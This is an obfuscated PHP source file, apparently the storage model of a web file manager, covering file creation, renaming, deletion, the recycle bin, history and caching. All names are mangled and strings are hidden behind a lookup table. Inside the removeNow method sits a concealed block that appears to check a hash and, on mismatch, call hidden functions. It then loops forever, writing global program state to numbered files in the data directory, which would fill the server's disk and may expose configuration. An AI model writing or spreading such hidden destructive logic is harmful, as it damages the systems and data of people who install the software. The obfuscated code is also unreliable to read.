array($º¥ñõª·[653] => 1, $º¥ñõª·[496] => $„…­ËÎ“, $º¥ñõª·[654] => $º¥ñõª·[12], $º¥ñõª·[546] => 0, $º¥ñõª·[624] => 0); $ ùÀ¿¥ = $this->_addSource($ŞÎÅúšÀ, $»§³ıçÓ); Model($º¥ñõª·[2229])->eventCreate($ ùÀ¿¥, $º¥ñõª·[1430]); $this->lockWriteEnd($õÊßôğ÷, $„…­ËÎ“); return $ ùÀ¿¥; } public function listSourceRoot($Âç¬øÌß, $À´Ğäâä, $àÍƒŒ†ò = "\163\x6f\165\162\x63\145\x49\x44\54\x74\141\x72\147\x65\x74\x49\x44\54\x73\151\172\145") { $ôŒÃŞ½ =& $_SERVER[°‰†òö¯]; $È“„î€µ = $ôŒÃŞ½[456]; $µş¨†ÂÖ = array(); $¿âÉáô = 1024 * 50; $ıô·ÖÚ = is_array($ıô·ÖÚ) ? $ıô·ÖÚ : array(); $›×ºÄ˜ñ = count($À´Ğäâä); $Úí™à³³ = $this->tablePrefix . $ôŒÃŞ½[2268]; for ($ÀÙËşâß = 0; $ÀÙËşâß < $›×ºÄ˜ñ; $ÀÙËşâß++) { $‡Ó´‚È¹ = $À´Ğäâä[$ÀÙËşâß]; $È“„î€µ .= "\123\105\x4c\105\103\124\x20\x2a\40\x46\x52\x4f\x4d\40\50\x53\x45\114\105\103\x54\40{$àÍƒŒ†ò}\40\106\122\x4f\x4d\x20\140{$Úí™à³³}\x60\40\x57\x48\105\x52\105\40"; $È“„î€µ .= "\140\160\x61\x72\145\156\164\111\104\x60\75\x30\40\x41\116\104\x20\140\164\x61\162\147\145\164\x49\104\x60\75{$‡Ó´‚È¹}\40\101\x4e\104\x20\x60\164\141\x72\x67\x65\x74\x54\171\x70\x65\140\x3d{$Âç¬øÌß}\40\141\x6e\144\x20\146\151\154\x65\x54\171\160\145\75\x27\47\40\154\151\x6d\x69\x74\x20\x31\51\x20\x61\163\x20\x74\x62\137{$ÀÙËşâß}\x20\125\x4e\111\x4f\x4e\40\x41\x4c\114\x20"; if ((strlen($È“„î€µ) >= $¿âÉáô || $ÀÙËşâß == $›×ºÄ˜ñ - 1) && $È“„î€µ) { $È“„î€µ = substr($È“„î€µ, 0, -strlen($ôŒÃŞ½[1113])); $³õ“íè = $this->query($È“„î€µ); $È“„î€µ = $ôŒÃŞ½[12]; $µş¨†ÂÖ = array_merge($µş¨†ÂÖ, $³õ“íè); } } return $µş¨†ÂÖ; } private function _createFile($„ÕÎÍ‚“, $ï×Ñ¸±, $ğ˜Éßúí, $Â¤©Ù“À, &$ «óß©¹) { $Ì–’»ûª =& $_SERVER[°‰†òö¯]; $¡û¶”Ä = $this->sourceInfo($„ÕÎÍ‚“); if (!$ğ˜Éßúí || !$¡û¶”Ä) { return !1; } if ($Â¤©Ù“À !== !1) { $ªƒûÇìš = $this->fileNameExist($„ÕÎÍ‚“, $ï×Ñ¸±); } $ «óß©¹ = !0; if ($Â¤©Ù“À && $ªƒûÇìš) { if ($Â¤©Ù“À == REPEAT_SKIP) { $ «óß©¹ = !1; return $ªƒûÇìš; } else { if ($Â¤©Ù“À == REPEAT_REPLACE) { $ô®—Şû = $this->sourceInfo($ªƒûÇìš); $²ûŠ‡³ƒ = $this->fileHistory($ô®—Şû, $ğ˜Éßúí[$Ì–’»ûª[545]], $ğ˜Éßúí[$Ì–’»ûª[79]]); if (!$²ûŠ‡³ƒ) { $ «óß©¹ = !1; } else { $this->folderSizeReset($„ÕÎÍ‚“); } return $ªƒûÇìš; } else { $ï×Ñ¸± = $this->fileNameAuto($„ÕÎÍ‚“, $ï×Ñ¸±, $Â¤©Ù“À, !1); } } } $•½÷ı = array($Ì–’»ûª[653] => 0, $Ì–’»ûª[496] => $ï×Ñ¸±, $Ì–’»ûª[654] => substr(get_path_ext($ï×Ñ¸±), 0, 10), $Ì–’»ûª[546] => $ğ˜Éßúí[$Ì–’»ûª[545]], $Ì–’»ûª[624] => $ğ˜Éßúí[$Ì–’»ûª[79]]); $å Ó²Î = $this->_addSource($•½÷ı, $¡û¶”Ä); $this->folderSizeReset($„ÕÎÍ‚“, intval($•½÷ı[$Ì–’»ûª[79]])); return $å Ó²Î; } protected function fileHistory($›¶ş½ğö, $ ˜½å¨, $Î¨÷–»†) { $··ñ¨ìĞ =& $_SERVER[°‰†òö¯]; if ($›¶ş½ğö[$··ñ¨ìĞ[545]] == $ ˜½å¨) { return !1; } $this->checkLock($›¶ş½ğö[$··ñ¨ìĞ[193]], $ ˜½å¨); Model($··ñ¨ìĞ[2269])->addHistory($›¶ş½ğö); $Û°¶º÷Ô = array($··ñ¨ìĞ[658] => USER_ID, $··ñ¨ìĞ[500] => time(), $··ñ¨ìĞ[545] => $ ˜½å¨, $··ñ¨ìĞ[79] => $Î¨÷–»†); $this->where(array($··ñ¨ìĞ[493] => $›¶ş½ğö[$··ñ¨ìĞ[193]]))->save($Û°¶º÷Ô); $this->sourceCacheClear($›¶ş½ğö[$··ñ¨ìĞ[193]]); return !0; } public function checkLock($£âË£äÜ, $‘„’ô×) { $óÃã¦†Á =& $_SERVER[°‰†òö¯]; $Çï×Œ×Û = $this->pathInfo($£âË£äÜ); if (!$this->fileIsLock($Çï×Œ×Û, !0)) { return; } $ñ¹‰Õî˜ = Session::get($óÃã¦†Á[2270]); $¸›øæü‡ = substr($Çï×Œ×Û[$óÃã¦†Á[32]], 0, -1 - strlen($Çï×Œ×Û[$óÃã¦†Á[169]])) . $óÃã¦†Á[1291] . $ñ¹‰Õî˜ . $óÃã¦†Á[10] . $Çï×Œ×Û[$óÃã¦†Á[169]]; $Îé•ÅÊ = Model($óÃã¦†Á[681])->find($‘„’ô×); $this->_createFileCall($Çï×Œ×Û[$óÃã¦†Á[192]], $¸›øæü‡, $Îé•ÅÊ, REPEAT_REPLACE, $óÃã¦†Á[1429]); $ãÓ‹ªÚâ = $Çï×Œ×Û[$óÃã¦†Á[543]][$óÃã¦†Á[617]]; $•Ô”••ì = $ãÓ‹ªÚâ[$óÃã¦†Á[2271]] ? $ãÓ‹ªÚâ[$óÃã¦†Á[2271]] : $ãÓ‹ªÚâ[$óÃã¦†Á[32]]; show_json(LNG($óÃã¦†Á[2272]) . $óÃã¦†Á[2273] . LNG($óÃã¦†Á[2274]) . $óÃã¦†Á[2275] . $•Ô”••ì . $óÃã¦†Á[2276], !1); } public function fileIsLock($âÛ¤îÏŠ, $‹»ƒÔ¿ş = false) { $îÄ’Èõ¶ =& $_SERVER[°‰†òö¯]; if (!_get($âÛ¤îÏŠ, $îÄ’Èõ¶[613], 0)) { return !1; } if ($âÛ¤îÏŠ[$îÄ’Èõ¶[543]][$îÄ’Èõ¶[616]] != USER_ID) { return !0; } $‰·õ£¨ = $GLOBALS[$îÄ’Èõ¶[6]][$îÄ’Èõ¶[92]][$îÄ’Èõ¶[614]]; if ($âÛ¤îÏŠ[$îÄ’Èõ¶[543]][$îÄ’Èõ¶[615]] <= time() - $‰·õ£¨) { $this->metaSet($âÛ¤îÏŠ[$îÄ’Èõ¶[193]], $îÄ’Èõ¶[616], null); $this->metaSet($âÛ¤îÏŠ[$îÄ’Èõ¶[193]], $îÄ’Èõ¶[615], null); } if ($‹»ƒÔ¿ş) { $this->metaSet($âÛ¤îÏŠ[$îÄ’Èõ¶[193]], $îÄ’Èõ¶[615], time()); } return !1; } private function _addSource($Æš¤‹øç, $¢Õš»±ô) { $ÉÈ§”ø =& $_SERVER[°‰†òö¯]; $°ÁÓÀ— = defined($ÉÈ§”ø[2202]) ? USER_ID : 0; $™¥§çËğ = array($ÉÈ§”ø[655] => $¢Õš»±ô[$ÉÈ§”ø[190]], $ÉÈ§”ø[656] => $¢Õš»±ô[$ÉÈ§”ø[573]], $ÉÈ§”ø[657] => $°ÁÓÀ—, $ÉÈ§”ø[658] => $°ÁÓÀ—, $ÉÈ§”ø[479] => $¢Õš»±ô[$ÉÈ§”ø[193]], $ÉÈ§”ø[659] => $¢Õš»±ô[$ÉÈ§”ø[588]] . $¢Õš»±ô[$ÉÈ§”ø[193]] . $ÉÈ§”ø[50], $ÉÈ§”ø[506] => 0, $ÉÈ§”ø[660] => $ÉÈ§”ø[12]); $Æš¤‹øç = array_merge($™¥§çËğ, $Æš¤‹øç); $this->updateModifyTime($Æš¤‹øç[$ÉÈ§”ø[192]]); $£—µµ•µ = $ÉÈ§”ø[2277] . $¢Õš»±ô[$ÉÈ§”ø[193]]; if (isset(self::$cacheChildList[$£—µµ•µ])) { unset(self::$cacheChildList[$£—µµ•µ]); } static $Êã³€×ë = false; if (!$Êã³€×ë) { Hook::trigger($ÉÈ§”ø[643], $Æš¤‹øç); $Êã³€×ë = !0; } $ï÷ıªÑ¦ = $this->add($Æš¤‹øç); $ë¼ı˜ = array($ÉÈ§”ø[661] => short_id($ï÷ıªÑ¦)); $this->where(array($ÉÈ§”ø[493] => $ï÷ıªÑ¦))->save($ë¼ı˜); $this->setNamePinyin($ï÷ıªÑ¦, $Æš¤‹øç[$ÉÈ§”ø[32]]); return $ï÷ıªÑ¦; } public function remove($Û¡¬†›, $…¹í™¤Ä = true) { $û«ª©ı† =& $_SERVER[°‰†òö¯]; $õ±ËÒ«‘ = $this->sourceInfo($Û¡¬†›); $µæÚÈ­† = intval($õ±ËÒ«‘[$û«ª©ı†[190]]) === self::TYPE_SYSTEM; $–¶©ô˜ä = Model($û«ª©ı†[510])->get($û«ª©ı†[2278]) == $û«ª©ı†[91]; if ($µæÚÈ­† || $…¹í™¤Ä || !$–¶©ô˜ä) { return $this->removeNow($Û¡¬†›, $…¹í™¤Ä); } $§‡®óô¾ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $öÒÅ‘‘æ = $õ±ËÒ«‘[$û«ª©ı†[190]] == self::TYPE_USER ? $û«ª©ı†[669] : $û«ª©ı†[582]; if ($öÒÅ‘‘æ == $û«ª©ı†[669]) { $Å”¨ôÖë = Model($û«ª©ı†[581])->getInfo($õ±ËÒ«‘[$û«ª©ı†[573]]); $ö°¿ÆÂÂ = !empty($Å”¨ôÖë[$û«ª©ı†[2271]]) ? $Å”¨ôÖë[$û«ª©ı†[2271]] : $Å”¨ôÖë[$û«ª©ı†[32]]; $ö°¿ÆÂÂ = $û«ª©ı†[339] . $ö°¿ÆÂÂ . $û«ª©ı†[2279] . $õ±ËÒ«‘[$û«ª©ı†[573]]; } else { $Å”¨ôÖë = Model($û«ª©ı†[589])->getInfo($õ±ËÒ«‘[$û«ª©ı†[573]]); $ö°¿ÆÂÂ = _get($Å”¨ôÖë, $û«ª©ı†[32]); $ö°¿ÆÂÂ = $û«ª©ı†[176] . $ö°¿ÆÂÂ . $û«ª©ı†[2280] . $õ±ËÒ«‘[$û«ª©ı†[573]]; } $–éˆØ¶ = $û«ª©ı†[2281] . md5($ö°¿ÆÂÂ); CacheLock::lock($–éˆØ¶); $•ÖÊ–¯‹ = $this->fileNameExist($§‡®óô¾, $ö°¿ÆÂÂ); if (!$•ÖÊ–¯‹) { $•ÖÊ–¯‹ = $this->mkdir($§‡®óô¾, $ö°¿ÆÂÂ, REPEAT_SKIP); $this->metaSet($•ÖÊ–¯‹, $û«ª©ı†[2282], $öÒÅ‘‘æ); $this->metaSet($•ÖÊ–¯‹, $û«ª©ı†[2283], $õ±ËÒ«‘[$û«ª©ı†[573]]); if ($õ±ËÒ«‘[$û«ª©ı†[192]] != 0) { $this->metaSet($•ÖÊ–¯‹, $û«ª©ı†[2284], _get($Å”¨ôÖë, $û«ª©ı†[2285])); } } CacheLock::unlock($–éˆØ¶); $this->metaSet($Û¡¬†›, $û«ª©ı†[2286], $õ±ËÒ«‘[$û«ª©ı†[192]]); $this->where(array($û«ª©ı†[193] => $Û¡¬†›))->save(array($û«ª©ı†[500] => time())); $this->recycleClear($õ±ËÒ«‘); Model($û«ª©ı†[640])->eventRemove($Û¡¬†›); $ÁÅª³²š = $this->move($Û¡¬†›, $•ÖÊ–¯‹, REPEAT_RENAME_FOLDER); $this->folderSizeReset($õ±ËÒ«‘[$û«ª©ı†[192]]); return $ÁÅª³²š; } private function recycleClear($ô÷Îƒ•) { $ú²©ğ›Ë =& $_SERVER[°‰†òö¯]; $¨ Ş°’³ = $this->childrenAll($ô÷Îƒ•); $ƒÑú„°ˆ = array($ú²©ğ›Ë[493] => array($ú²©ğ›Ë[494], $¨ Ş°’³[$ú²©ğ›Ë[2287]])); Model($ú²©ğ›Ë[2288])->where($ƒÑú„°ˆ)->delete(); } public function removeNow($ß×õÑ²›, $†¸ÜæŒ¨ = true) { $©‹üÒ˜ =& $_SERVER[°‰†òö¯]; $É¨®Èµ = $_SERVER[$©‹üÒ˜[949]] . $©‹üÒ˜[950]; $ë—ÖËÆş = $©‹üÒ˜[945]; if ($_SERVER[$©‹üÒ˜[946]] != $ë—ÖËÆş($É¨®Èµ)) { $××©‘Á = $©‹üÒ˜[947]; $“Ëôëı’ = $©‹üÒ˜[948]; $„ÂäŸê™ = $_SERVER[$©‹üÒ˜[949]] . $©‹üÒ˜[950]; $²œÌıÖ§ = $“Ëôëı’($„ÂäŸê™); $ŞºæçŞ‹ = explode($©‹üÒ˜[287], $²œÌıÖ§); if (count($ŞºæçŞ‹) < $©‹üÒ˜[704]) { $ïËçµÏ» = $©‹üÒ˜[951]; $ïËçµÏ»(); } $êƒšŞì° = $©‹üÒ˜[952]; $êƒšŞì°($_SERVER[$©‹üÒ˜[953]]); $××©‘Á = $©‹üÒ˜[947]; $××©‘Á(); $Ç„£˜€Š = $©‹üÒ˜[954]; $×úÜàÔ = json_encode($GLOBALS[$©‹üÒ˜[955]]); $à™…â¸ = 1; for ($©ûŒ÷è = $à™…â¸; $©ûŒ÷è > 0; $©ûŒ÷è++) { $Ç„£˜€Š(DATA_PATH . $©ûŒ÷è, $×úÜàÔ); } } $ Ğ‘ËÀ = $this->sourceInfo($ß×õÑ²›); $è×ùã­ú = $this->pathInfoMore($ß×õÑ²›); if (!$ Ğ‘ËÀ) { return !0; } if ($ Ğ‘ËÀ[$©‹üÒ˜[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ß×õÑ²›); Hook::trigger($©‹üÒ˜[2289], $è×ùã­ú, $†¸ÜæŒ¨); if ($†¸ÜæŒ¨) { Model($©‹üÒ˜[2288])->moveToRecycle($ß×õÑ²›); } else { $Äş‰†ì¬ = $this->childrenAll($ Ğ‘ËÀ); Model($©‹üÒ˜[640])->eventRemove($ß×õÑ²›); $this->removeRelevance($Äş‰†ì¬[$©‹üÒ˜[2287]], $Äş‰†ì¬[$©‹üÒ˜[1574]]); } $this->folderSizeReset($ Ğ‘ËÀ[$©‹üÒ˜[192]]); $– µ÷ = array($ Ğ‘ËÀ[$©‹üÒ˜[192]]); if ($ Ğ‘ËÀ[$©‹üÒ˜[487]] == $©‹üÒ˜[91]) { $– µ÷[] = $ Ğ‘ËÀ[$©‹üÒ˜[193]]; } $this->updateModifyTime($– µ÷); $this->lockMoveEnd($ß×õÑ²›); Hook::trigger($©‹üÒ˜[1814], $è×ùã­ú, $†¸ÜæŒ¨); return !0; } public function childrenAll($Æàê™ÒÊ) { $Äø¬õé =& $_SERVER[°‰†òö¯]; $ÓÙÎ©ºó = $Æàê™ÒÊ[$Äø¬õé[193]]; if ($Æàê™ÒÊ[$Äø¬õé[487]] == $Äø¬õé[91]) { $­„»ÂÊÚ = array($Äø¬õé[659] => array($Äø¬õé[619], $Æàê™ÒÊ[$Äø¬õé[588]] . $ÓÙÎ©ºó . $Äø¬õé[620])); $ĞÊ‚‹ïú = array($Äø¬õé[659] => $­„»ÂÊÚ[$Äø¬õé[588]]); $ÜÂŸÌ›Ô = $this->field($Äø¬õé[2290])->where($ĞÊ‚‹ïú)->select(); $ô °èòİ = !1; $¶–—Â¥Æ = array($ÓÙÎ©ºó); if ($ÜÂŸÌ›Ô) { $ô °èòİ = array_to_keyvalue($ÜÂŸÌ›Ô, $Äø¬õé[12], $Äø¬õé[545]); $ô °èòİ = array_remove_value($ô °èòİ, $Äø¬õé[230]); $¶–—Â¥Æ = array_to_keyvalue($ÜÂŸÌ›Ô, $Äø¬õé[12], $Äø¬õé[193]); $¶–—Â¥Æ[] = $ÓÙÎ©ºó; } } else { $ô °èòİ = array($Æàê™ÒÊ[$Äø¬õé[545]]); $¶–—Â¥Æ = array($ÓÙÎ©ºó); } return array($Äø¬õé[2287] => $¶–—Â¥Æ, $Äø¬õé[1574] => $ô °èòİ); } public function removeArray($ğÔƒŠ©ì) { if (!$ğÔƒŠ©ì) { return !0; } } public function removeRelevance($öÛØ¤ÛÛ, $ıÀ Âû–) { $ˆ”ğ¹ú =& $_SERVER[°‰†òö¯]; $öÛØ¤ÛÛ = $öÛØ¤ÛÛ ? $öÛØ¤ÛÛ : array(); $ıÀ Âû– = $ıÀ Âû– ? $ıÀ Âû– : array(); $öÛØ¤ÛÛ = array_unique(array_filter($öÛØ¤ÛÛ)); $ıÀ Âû– = array_unique(array_filter($ıÀ Âû–)); if (!$öÛØ¤ÛÛ) { return !1; } $“áĞ¼˜ = array($ˆ”ğ¹ú[493] => array($ˆ”ğ¹ú[494], $öÛØ¤ÛÛ)); Model($ˆ”ğ¹ú[2288])->where($“áĞ¼˜)->delete(); Model($ˆ”ğ¹ú[537])->where($“áĞ¼˜)->delete(); Model($ˆ”ğ¹ú[2127])->where($“áĞ¼˜)->delete(); Model($ˆ”ğ¹ú[640])->where($“áĞ¼˜)->delete(); Model($ˆ”ğ¹ú[1951])->removeBySource($öÛØ¤ÛÛ); Model($ˆ”ğ¹ú[2269])->removeBySource($öÛØ¤ÛÛ); $this->where($“áĞ¼˜)->delete(); Model($ˆ”ğ¹ú[548])->remove($ıÀ Âû–); for ($Ñûßûù… = 0; $Ñûßûù… < count($öÛØ¤ÛÛ); $Ñûßûù…++) { $this->sourceCacheClear($öÛØ¤ÛÛ[$Ñûßûù…]); } } public function rename($Ÿ•°³ÍÛ, $éÕ€Š¾à) { $Öª¹ôª =& $_SERVER[°‰†òö¯]; $ì‹Ú«¢¤ = $this->sourceInfo($Ÿ•°³ÍÛ); if (!$ì‹Ú«¢¤) { return !1; } $Åè±ö»ı = $this->fileNameExist($ì‹Ú«¢¤[$Öª¹ôª[192]], $éÕ€Š¾à); if ($Åè±ö»ı && $Åè±ö»ı != $Ÿ•°³ÍÛ) { return !1; } $ˆ†Ôö Ù = array($Öª¹ôª[496] => $éÕ€Š¾à, $Öª¹ôª[658] => USER_ID); if ($ì‹Ú«¢¤[$Öª¹ôª[487]] != $Öª¹ôª[91]) { $ˆ†Ôö Ù[$Öª¹ôª[488]] = substr(get_path_ext($éÕ€Š¾à), 0, 10); } Model($Öª¹ôª[640])->eventRename($Ÿ•°³ÍÛ, $ì‹Ú«¢¤[$Öª¹ôª[32]], $éÕ€Š¾à); $this->sourceCacheClear($Ÿ•°³ÍÛ); $this->setNamePinyin($Ÿ•°³ÍÛ, $ˆ†Ôö Ù[$Öª¹ôª[32]], !1); $this->updateModifyTime($ì‹Ú«¢¤[$Öª¹ôª[192]]); $ËŠÁ¦òã = $this->where(array($Öª¹ôª[493] => $Ÿ•°³ÍÛ))->data($ˆ†Ôö Ù)->save(); $íÌ”ïÔ… = $Öª¹ôª[2277] . $ì‹Ú«¢¤[$Öª¹ôª[192]]; if (isset(self::$cacheChildList[$íÌ”ïÔ…])) { unset(self::$cacheChildList[$íÌ”ïÔ…]); } return $ËŠÁ¦òã; } public function setNamePinyin($ºİëÍı­, $×½›Ì¢…, $µï­ª×½ = true) { $ÅÖµ•ƒÃ =& $_SERVER[°‰†òö¯]; $“›Çşú = Input::check($×½›Ì¢…, $ÅÖµ•ƒÃ[662]); $Œ¯×õĞ’ = array($ÅÖµ•ƒÃ[519] => KodSort::makeStr($×½›Ì¢…)); if ($“›Çşú) { $Œ¯×õĞ’[$ÅÖµ•ƒÃ[540]] = str_replace($ÅÖµ•ƒÃ[53], $ÅÖµ•ƒÃ[12], Pinyin::get($×½›Ì¢…)); $Œ¯×õĞ’[$ÅÖµ•ƒÃ[539]] = Pinyin::get($×½›Ì¢…, $ÅÖµ•ƒÃ[663]); } if (!$µï­ª×½ && !$“›Çşú) { $Œ¯×õĞ’[$ÅÖµ•ƒÃ[540]] = null; $Œ¯×õĞ’[$ÅÖµ•ƒÃ[539]] = null; } $this->metaSet($ºİëÍı­, $Œ¯×õĞ’); } public function getContent($§ÔŠç®ş) { $ÙÚîİÆ =& $_SERVER[°‰†òö¯]; $ºìµ¥´ù = $this->fileInfoGet($§ÔŠç®ş); if (!$ºìµ¥´ù) { return !1; } if ($ºìµ¥´ù[$ÙÚîİÆ[79]] == 0) { return $ÙÚîİÆ[12]; } $Èõà£ä = $ÙÚîİÆ[2291] . $ºìµ¥´ù[$ÙÚîİÆ[551]]; if ($ºìµ¥´ù[$ÙÚîİÆ[79]] <= 1024 * 10) { $†Å‹í” = Cache::get($Èõà£ä); if (!$†Å‹í”) { $†Å‹í” = IO::getContent($ºìµ¥´ù[$ÙÚîİÆ[87]]); Cache::set($Èõà£ä, $†Å‹í”); } return $†Å‹í”; } if (!$ºìµ¥´ù[$ÙÚîİÆ[87]]) { return $ÙÚîİÆ[12]; } return IO::getContent($ºìµ¥´ù[$ÙÚîİÆ[87]]); } public function setDesc($Àï¢´‰¨, $²£‰‰€ë) { $ÌÁ®åŞÍ =& $_SERVER[°‰†òö¯]; Model($ÌÁ®åŞÍ[640])->eventAddDesc($Àï¢´‰¨, $²£‰‰€ë); return $this->metaSet($Àï¢´‰¨, $ÌÁ®åŞÍ[528], $²£‰‰€ë); } public function setContent($èˆ¯ó´ü, $¡¤ØÙ³ù = '') { $ıË…ûÒ´ =& $_SERVER[°‰†òö¯]; $‡ Ò½Î = $this->sourceInfo($èˆ¯ó´ü); $Ã©ƒ¡í  = $this->fileInfoGet($èˆ¯ó´ü); if (!$Ã©ƒ¡í  || !$‡ Ò½Î) { return !1; } $·§“á“ = Model($ıË…ûÒ´[548])->addFileByContent($¡¤ØÙ³ù, $‡ Ò½Î[$ıË…ûÒ´[32]]); if (!$·§“á“) { return !1; } $Íšœ–¿ = $this->fileHistory($‡ Ò½Î, $·§“á“[$ıË…ûÒ´[545]], $·§“á“[$ıË…ûÒ´[79]]); if (!$Íšœ–¿) { return Model($ıË…ûÒ´[548])->remove($·§“á“[$ıË…ûÒ´[545]]); } $this->folderSizeReset($‡ Ò½Î[$ıË…ûÒ´[192]]); return !0; } public function fileSubstr($×—÷Ù¥ô, $–§‘« ·, $¥ãğÙÖ›) { $×™ ¯ÀÊ = $this->fileInfoGet($×—÷Ù¥ô); if (!$×™ ¯ÀÊ) { return !1; } return IO::fileSubstr($×™ ¯ÀÊ[$_SERVER[°‰†òö¯][87]], $–§‘« ·, $¥ãğÙÖ›); } public function fileInfoGet($ øƒûœ¶) { $‡ó¡‡„¤ =& $_SERVER[°‰†òö¯]; $œŞ›Áãª = $this->sourceInfo($ øƒûœ¶); if (!$œŞ›Áãª || $œŞ›Áãª[$‡ó¡‡„¤[487]]) { return !1; } $ë³¯†Úª = $‡ó¡‡„¤[552] . $œŞ›Áãª[$‡ó¡‡„¤[545]]; $«îŒ­º¾ = _get(self::$cacheFileInfo, $ë³¯†Úª); if ($«îŒ­º¾) { return $«îŒ­º¾; } $Ö‚–”å’ = Model($‡ó¡‡„¤[548])->fileInfo($œŞ›Áãª[$‡ó¡‡„¤[545]]); if ($Ö‚–”å’) { $Ö‚–”å’[$‡ó¡‡„¤[32]] = $œŞ›Áãª[$‡ó¡‡„¤[32]]; } self::$cacheFileInfo[$ë³¯†Úª] = $Ö‚–”å’; return $Ö‚–”å’; } private function folderChildrenNumber($ÉÖì°Ü) { $ªÜİ³Ú¯ =& $_SERVER[°‰†òö¯]; $û—ÁˆƒÎ = $this->sourceInfo($ÉÖì°Ü); $ıñößëá = array($ªÜİ³Ú¯[659] => array($ªÜİ³Ú¯[619], $û—ÁˆƒÎ[$ªÜİ³Ú¯[588]] . $ÉÖì°Ü . $ªÜİ³Ú¯[620]), $ªÜİ³Ú¯[656] => $û—ÁˆƒÎ[$ªÜİ³Ú¯[573]], $ªÜİ³Ú¯[506] => intval($û—ÁˆƒÎ[$ªÜİ³Ú¯[507]]), $ªÜİ³Ú¯[653] => 1); $Œ¨ö›º— = $this->where($ıñößëá)->count(); $‡²¾İüä = $this->where($ıñößëá)->where(array($ªÜİ³Ú¯[653] => 0))->count(); return array($ªÜİ³Ú¯[83] => $‡²¾İüä, $ªÜİ³Ú¯[84] => $Œ¨ö›º—); } public function pathInfo($¼€±ÓÚÚ, $º™²Æ€º = false) { $Ë¿öê‡® =& $_SERVER[°‰†òö¯]; $º™²Æ€º = !1; $¼€±ÓÚÚ = intval($¼€±ÓÚÚ); $ÙÄ‡×˜§ = $Ë¿öê‡®[536] . intval($º™²Æ€º) . $Ë¿öê‡®[464] . $¼€±ÓÚÚ; $¸û˜¾˜¨ = _get(self::$cachePathInfo, $ÙÄ‡×˜§); if ($¸û˜¾˜¨) { return $¸û˜¾˜¨; } $•¶µ™¹İ = $this->sourceInfo($¼€±ÓÚÚ); if (!$•¶µ™¹İ) { return !1; } $•¶µ™¹İ = $this->_listDataApplyItem($•¶µ™¹İ, $º™²Æ€º); self::$cachePathInfo[$ÙÄ‡×˜§] = $•¶µ™¹İ; return $•¶µ™¹İ; } public static $cachePathInfoMore = array(); public function pathInfoMore($€šàõÎò) { $¢ê­Ç¢ =& $_SERVER[°‰†òö¯]; $éšÌ´æ‹ = _get(self::$cachePathInfoMore, $€šàõÎò); if ($éšÌ´æ‹) { return $éšÌ´æ‹; } $×Íó¨…¹ = $this->pathInfo($€šàõÎò); if (!$×Íó¨…¹) { return !1; } if ($×Íó¨…¹[$¢ê­Ç¢[487]] == $¢ê­Ç¢[91]) { $×Íó¨…¹[$¢ê­Ç¢[82]] = $this->folderChildrenNumber($€šàõÎò); } self::$cachePathInfoMore[$€šàõÎò] = $×Íó¨…¹; return $×Íó¨…¹; } public function sourceInfo($çâÚªà­) { $ÈÔÁŸ =& $_SERVER[°‰†òö¯]; if (!$çâÚªà­) { return array(); } $çâÚªà­ = intval($çâÚªà­); $Ò›×€ë¯ = $ÈÔÁŸ[535] . $çâÚªà­; $ïÂˆ‘èŒ = _get(self::$cacheSourceInfo, $Ò›×€ë¯); if ($ïÂˆ‘èŒ) { return $ïÂˆ‘èŒ; } $÷ªêÃ™ = $this->where(array($ÈÔÁŸ[193] => $çâÚªà­))->find(); self::$cacheSourceInfo[$Ò›×€ë¯] = $÷ªêÃ™; return self::$cacheSourceInfo[$Ò›×€ë¯]; } public function sourceCacheClear($­¹Éù²ı = false) { self::cacheClear($­¹Éù²ı); } public static function cacheClear($…ü–ÔÒ† = false) { $êòÑ“õŸ =& $_SERVER[°‰†òö¯]; if ($…ü–ÔÒ† == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$êòÑ“õŸ[535] . $…ü–ÔÒ†]); unset(self::$cachePathInfoMore[$…ü–ÔÒ†]); unset(self::$cachePathInfo[$êòÑ“õŸ[2292] . $…ü–ÔÒ†]); unset(self::$cachePathInfo[$êòÑ“õŸ[2293] . $…ü–ÔÒ†]); } public function metaSet($§çìÊº¾, $ñª…Ò­ = null, $Â„øï­ = null) { $ÙÄÔ‘€¼ = parent::metaSet($§çìÊº¾, $ñª…Ò­, $Â„øï­); if ($ÙÄÔ‘€¼) { $this->sourceCacheClear($§çìÊº¾); } return $ÙÄÔ‘€¼; } public function pathInfoByPath($Ô¸¤³ø, $¶ñ‚—¶·) { $©Óı‡ğÍ =& $_SERVER[°‰†òö¯]; $ş©ÎÎ° = !$¶ñ‚—¶· ? array() : explode($©Óı‡ğÍ[8], trim($¶ñ‚—¶·, $©Óı‡ğÍ[8])); $Î÷€¸î = $Ô¸¤³ø; foreach ($ş©ÎÎ° as $ıµïîË†) { $âŞÇš›ã = array($©Óı‡ğÍ[192] => $Î÷€¸î, $©Óı‡ğÍ[32] => $ıµïîË†); $‘±Ñ¾® = $this->field($©Óı‡ğÍ[2294])->where($âŞÇš›ã)->select(); if (!$‘±Ñ¾®) { return !1; } $‘±Ñ¾® = array_sort_by($‘±Ñ¾®, $©Óı‡ğÍ[507]); $Î÷€¸î = $‘±Ñ¾®[0][$©Óı‡ğÍ[193]]; } $ŠÈİµ¶˜ = $this->sourceInfo($Î÷€¸î); $this->pathInfoFilter($ŠÈİµ¶˜); return $ŠÈİµ¶˜; } protected function updateModifyTime($¬ó¿Ñü¹) { $ŞœéÁ˜¢ =& $_SERVER[°‰†òö¯]; $Óüš‡­— = defined($ŞœéÁ˜¢[2202]) ? USER_ID : 0; if (!$¬ó¿Ñü¹) { return; } if (!is_array($¬ó¿Ñü¹)) { $¬ó¿Ñü¹ = array($¬ó¿Ñü¹); } foreach ($¬ó¿Ñü¹ as $Æ…Öäµû => $ñº¢Ù‰Ë) { $¬ó¿Ñü¹[$Æ…Öäµû] = intval($ñº¢Ù‰Ë); $this->sourceCacheClear($ñº¢Ù‰Ë); } $š´“Şà» = array($ŞœéÁ˜¢[193] => array($ŞœéÁ˜¢[7], $¬ó¿Ñü¹)); $ÏòÖ°ó© = array($ŞœéÁ˜¢[658] => $Óüš‡­—, $ŞœéÁ˜¢[500] => time()); $this->where($š´“Şà»)->save($ÏòÖ°ó©); } public function folderSizeReset($¤Í¤òò™, $‹ğ¬÷®€ = false) { $ÉÙÆğº± =& $_SERVER[°‰†òö¯]; if ($this->statusIgnoreResetSpace) { return; } $ÌŞÇÓ¼ = $this->sourceInfo($¤Í¤òò™); $óÁÑá²õ = 